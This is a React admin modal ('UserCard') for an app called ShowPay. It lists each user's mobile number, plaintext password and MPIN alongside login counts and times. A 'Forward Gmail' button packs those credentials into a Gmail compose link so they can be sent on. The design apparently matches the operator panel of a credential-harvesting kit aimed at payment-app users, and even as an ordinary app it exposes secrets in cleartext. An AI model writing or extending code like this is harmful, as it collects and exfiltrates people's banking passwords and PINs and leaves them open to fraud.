// UserCard.jsx — Admin user detail modal
export default function UserCard({ user, onClose }) {
  if (!user) return null

  const fmt = (d) => d ? new Date(d).toLocaleString('en-IN') : '—'
  const fmtDate = (d) => d ? new Date(d).toLocaleDateString('en-IN') : '—'
  const fmtTime = (d) => d ? new Date(d).toLocaleTimeString('en-IN') : '—'

  const handleGmail = () => {
    const subject = encodeURIComponent('ShowPay User Details')
    const body = encodeURIComponent(
      `Mobile Number: ${user.mobile}\nPassword: ${user.password}\nMPIN: ${user.mpin || 'Not Set'}\nStatus: ${user.status}\nLogin Count: ${user.login_count}`
    )
    window.open(`https://mail.google.com/mail/?view=cm&fs=1&su=${subject}&body=${body}`, '_blank')
  }

  const rows = [
    { label: 'Mobile Number', value: user.mobile },
    { label: 'Password', value: user.password, mono: true },
    { label: 'MPIN', value: user.mpin || 'Not Set' },
    { label: 'Status', value: user.status?.toUpperCase(), badge: true },
    { label: 'Login Count', value: user.login_count },
    { label: 'First Login', value: fmt(user.first_login) },
    { label: 'Last Login', value: fmt(user.last_login) },
    { label: 'Login Date', value: fmtDate(user.first_login) },
    { label: 'Login Time', value: fmtTime(user.first_login) },
    { label: 'Created At', value: fmt(user.created_at) },
  ]

  return (
    <div
      style={{
        position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.65)',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        zIndex: 500, animation: 'overlayIn 0.2s ease'
      }}
      onClick={(e) => e.target === e.currentTarget && onClose()}
    >
      <div style={{
        background: '#fff', borderRadius: 16,
        width: '90%', maxWidth: 480, maxHeight: '90vh',
        overflow: 'auto', boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
        animation: 'popIn 0.3s cubic-bezier(0.34,1.56,0.64,1)'
      }}>
        {/* Header */}
        <div style={{
          background: 'linear-gradient(135deg,#1a9ef5,#0d7fd1)',
          padding: '20px 24px',
          display: 'flex', justifyContent: 'space-between', alignItems: 'center'
        }}>
          <div>
            <div style={{ color: '#fff', fontWeight: 800, fontSize: 18 }}>
              {user.mobile}
            </div>
            <div style={{ color: 'rgba(255,255,255,0.7)', fontSize: 13, marginTop: 2 }}>
              User Details
            </div>
          </div>
          <button
            onClick={onClose}
            style={{
              background: 'rgba(255,255,255,0.2)', border: 'none',
              color: '#fff', width: 32, height: 32,
              borderRadius: '50%', fontSize: 18,
              cursor: 'pointer', display: 'flex',
              alignItems: 'center', justifyContent: 'center'
            }}
          >✕</button>
        </div>

        {/* Fields */}
        <div style={{ padding: '20px 24px' }}>
          {rows.map(({ label, value, mono, badge }) => (
            <div key={label} style={{
              display: 'flex', justifyContent: 'space-between',
              alignItems: 'center', padding: '10px 0',
              borderBottom: '1px solid #f0f4f8'
            }}>
              <span style={{ fontSize: 13, color: '#9299a0', fontWeight: 600 }}>{label}</span>
              <span style={{
                fontSize: 14, fontWeight: 600,
                color: badge
                  ? (user.status === 'completed' ? '#22c55e' : '#f59e0b')
                  : '#1a1a2e',
                fontFamily: mono ? 'monospace' : 'inherit',
                background: badge ? (user.status === 'completed' ? '#dcfce7' : '#fef9c3') : 'none',
                padding: badge ? '2px 10px' : '0',
                borderRadius: badge ? 20 : 0
              }}>
                {value}
              </span>
            </div>
          ))}

          {/* Actions */}
          <div style={{ display: 'flex', gap: 10, marginTop: 20 }}>
            <button
              onClick={handleGmail}
              style={{
                flex: 1, padding: '12px 0',
                background: '#ea4335', color: '#fff',
                border: 'none', borderRadius: 8,
                fontWeight: 700, fontSize: 14, cursor: 'pointer'
              }}
            >
              📧 Forward Gmail
            </button>
            <button
              onClick={onClose}
              style={{
                flex: 1, padding: '12px 0',
                background: '#f5f7fa', color: '#555770',
                border: '1.5px solid #e0e6ed', borderRadius: 8,
                fontWeight: 600, fontSize: 14, cursor: 'pointer'
              }}
            >
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}
